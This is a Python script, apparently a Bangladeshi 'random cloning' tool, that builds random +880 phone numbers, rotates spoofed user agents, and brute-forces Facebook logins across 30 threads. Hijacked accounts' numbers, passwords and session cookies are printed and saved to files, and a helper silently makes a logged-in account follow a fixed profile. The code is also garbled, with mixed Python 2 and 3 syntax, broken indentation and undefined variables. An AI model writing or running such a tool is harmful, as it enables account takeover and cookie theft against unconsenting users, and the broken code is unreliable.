# Facebook: Tutul King
# Github: Tutul-King
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌐] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌐] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
 
os.system('clear')
print
 
print
 
print("""
os.system('xdg-open https://www.facebook.com/profile.php?id=100077855090738/')
\033[1;92m███████ ███████ ███    ██  █████  ██    ██ ███████ ██
  \033[1;92m██      ██      ████   ██ ██   ██  ██  ██  ██      ██      
  \033[1;92m███████ █████   ██ ██  ██ ███████   ████   █████   ██      
  \033[1;92m     ██ ██      ██  ██ ██ ██   ██    ██    ██      ██      
  \033[1;92m███████ ███████ ██   ████ ██   ██    ██    ███████ ███████ 
         
 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mSENAYEL ISLAM (DIP)   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m SENAYE ISLAM		 \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mMAGIC-DIP..           \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning BD     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mKGF                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36mMAX                   \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m DIP TERMUX HELPING ZONE....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××
""")

print("\033[0;91mThis Tool's DIP")

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

psb('\x1b[1;92mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
for n in range(90000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
 

os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
 ('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 5.1)','Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)''Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)','Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}','Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2','Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)','Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)','Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3','Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)','Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60','Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)','Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36','Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)','WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)','WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)','WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)','WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)','WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)','WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)','WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)','WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)','WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)','WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)','WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)','WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)','WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)','WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)','WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)','WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)','WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)','Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; W','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
def exb():
    print
    os.sys.exit()
 
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
 
def t():
    time.sleep(1)
 
 
def cb():
    os.system('clear')
 
logo = """
                                                                     
                                                                                            \033[0;94m     ___    _  _     ___    _  _    _____    ___   
\033[1;92m███████ ███████ ███    ██  █████  ██    ██ ███████ ██
  \033[1;92m██      ██      ████   ██ ██   ██  ██  ██  ██      ██      
  \033[1;92m███████ █████   ██ ██  ██ ███████   ████   █████   ██      
  \033[1;92m     ██ ██      ██  ██ ██ ██   ██    ██    ██      ██      
  \033[1;92m███████ ███████ ██   ████ ██   ██    ██    ███████ ███████ 
         
 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mSENAYEL ISLAM (DIP)   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m SENAYE ISLAM		 \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mMAGIC-DIP..           \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning BD     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mKGF                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36mMAX                   \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m DIP TERMUX HELPING ZONE....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××
"""

back = 0
successful = []
cpb = []
oks = []
id = []
 
def menu():
    os.system('clear')
    print logo
    print ''
    print ''
    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '\033[0;91m'
    print 50* '-'
    print '\033[0;92m[1]  \x1b[1;93mGP'
    print '\033[0;95m[2]  \x1b[1;95mRobi'
    print '\033[0;94m[3]  \x1b[1;94mAirtel'
    print '\033[0;92m[4]  \x1b[1;92mBanglalink'
    print '\033[0;96m[5]  \x1b[1;96mTeletalk'
    print '\033[0;90m[0]  \x1b[1;90mExit            '
    print '\033[0;91m'
    print 50 * '-'
    action()
 
 
def action():
    global cpb
    global oks
    bch = raw_input('\033[0;93m\n> ')
    if bch == '':
        print
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
        print''
        try:
            c = raw_input('\033[0;93mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '2':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
        print''
        try:
            c = raw_input('\033[0;93mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '3':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
        print''
        try:
            c = raw_input('\033[0;93mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '4':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
        print''
        try:
            c = raw_input('\033[0;93mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '5':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
        print''
        try:
            c = raw_input('\033[0;93mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '0':
        exb()
    else:
        print
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x96] Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    psb(50 * '-')
    time.sleep(0.5)
    print
    50 * '-'
    print
 
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
 
        try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
			'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=5pK-Yy7UNacH3NUrKht_YPrO; sb=5pK-Y0b1ZMQ2H4KyjfKqVnrJ; wd=461x834; fr=0vcQXYk6gxd5CDEhC..BjvtWw.2s.AAA.0.0.Bjv8h-.AWWeMw5mIXE',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            	lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
                print '\x1b[1;92m[SENAYEL-OK🍼]  ' +uid+ ' | ' +ps+    '  \n\033[1;35m[‎‎🍪]\033[1;32mCOOKIE = \033[1;32m'+coki+  ' \n\033[1;32m')
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[SENAYEL-CP💔]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a').write(cid+' | '+ps+'\n')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass
 
    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2-shanto.py')
 
 
if __name__ == '__main__':
    menu()

